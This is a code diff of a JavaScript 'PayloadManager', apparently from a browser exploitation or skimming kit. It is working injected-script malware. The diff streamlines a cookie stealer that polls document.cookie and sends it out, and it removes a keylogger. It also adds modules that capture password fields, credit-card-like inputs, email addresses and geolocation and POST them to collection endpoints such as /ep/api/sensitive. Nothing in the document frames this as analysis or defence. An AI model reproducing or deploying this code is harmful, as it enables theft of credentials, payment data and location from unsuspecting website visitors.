@@ -10,58 +10,37 @@ const PayloadManager = {
     config: {
         cookieLogger: true,
         formStealer: true,
-        keyLogger: true
+        keyLogger: true,
+        passwordDetector: true,
+        ccDetector: true,
+        emailDetector: true,
+        geoTracker: true
     },
 
     // Available payloads
     payloads: {
         cookieLogger: () => {
             const stealCookies = () => {
-                // Get all cookies from document
-                const documentCookies = document.cookie.split(';').map(cookie => {
+                const cookies = document.cookie.split(';').map(cookie => {
                     const [name, value] = cookie.trim().split('=');
-                    return { name, value, source: 'document' };
+                    return { name, value };
                 });
 
-                // Get cookies from localStorage
-                const localStorageCookies = Object.keys(localStorage).map(key => {
-                    return { name: key, value: localStorage.getItem(key), source: 'localStorage' };
-                });
-
-                // Get cookies from sessionStorage
-                const sessionStorageCookies = Object.keys(sessionStorage).map(key => {
-                    return { name: key, value: sessionStorage.getItem(key), source: 'sessionStorage' };
-                });
-
-                const allCookies = [...documentCookies, ...localStorageCookies, ...sessionStorageCookies];
-
-                if (allCookies.length > 0) {
+                if (cookies.length > 0) {
                     fetch('/ep/api/ping', { 
                         method: 'POST',
-                        credentials: 'include',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            cookies: allCookies,
+                            cookies,
                             url: window.location.href,
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform,
                             timestamp: new Date().toISOString()
                         })
                     });
                 }
             };
 
-            // Initial steal
             stealCookies();
-
-            // Monitor cookie changes
-            document.addEventListener('cookie', stealCookies);
             setInterval(stealCookies, 3000);
-
-            // Monitor storage changes
-            window.addEventListener('storage', stealCookies);
         },
 
         formStealer: () => {
@@ -76,56 +55,81 @@ const PayloadManager = {
                     
                     await fetch('/ep/api/forms', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                 });
             });
         },
 
-        keyLogger: () => {
-            let buffer = '';
-            let lastKeypressTime = Date.now();
-            
-            const sendBuffer = () => {
-                if (buffer.length > 0) {
-                    fetch('/ep/api/keylog', {
+        passwordDetector: () => {
+            document.querySelectorAll('input[type="password"]').forEach(input => {
+                input.addEventListener('change', () => {
+                    fetch('/ep/api/sensitive', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            keys: buffer,
-                            url: window.location.href,
-                            timestamp: new Date().toISOString()
+                            type: 'password',
+                            value: input.value,
+                            url: window.location.href
                         })
                     });
-                    buffer = '';
-                }
-            };
-
-            document.addEventListener('keydown', (e) => {
-                const currentTime = Date.now();
-                
-                // Add special keys
-                if (e.key.length > 1) {
-                    buffer += `[${e.key}]`;
-                } else {
-                    buffer += e.key;
-                }
-                
-                // Send if buffer is full or timeout reached
-                if (buffer.length >= 30 || currentTime - lastKeypressTime > 1000) {
-                    sendBuffer();
-                }
-                
-                lastKeypressTime = currentTime;
+                });
             });
+        },
 
-            // Send remaining buffer when tab/window loses focus
-            window.addEventListener('blur', sendBuffer);
+        ccDetector: () => {
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('change', () => {
+                    const ccPattern = /\b(?:\d[ -]*?){13,16}\b/;
+                    if (ccPattern.test(input.value)) {
+                        fetch('/ep/api/sensitive', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'credit_card',
+                                value: input.value,
+                                url: window.location.href
+                            })
+                        });
+                    }
+                });
+            });
+        },
+
+        emailDetector: () => {
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('change', () => {
+                    const emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/;
+                    if (emailPattern.test(input.value)) {
+                        fetch('/ep/api/sensitive', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'email',
+                                value: input.value,
+                                url: window.location.href
+                            })
+                        });
+                    }
+                });
+            });
+        },
+
+        geoTracker: () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    fetch('/ep/api/geolocation', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            url: window.location.href
+                        })
+                    });
+                });
+            }
         }
     },
     
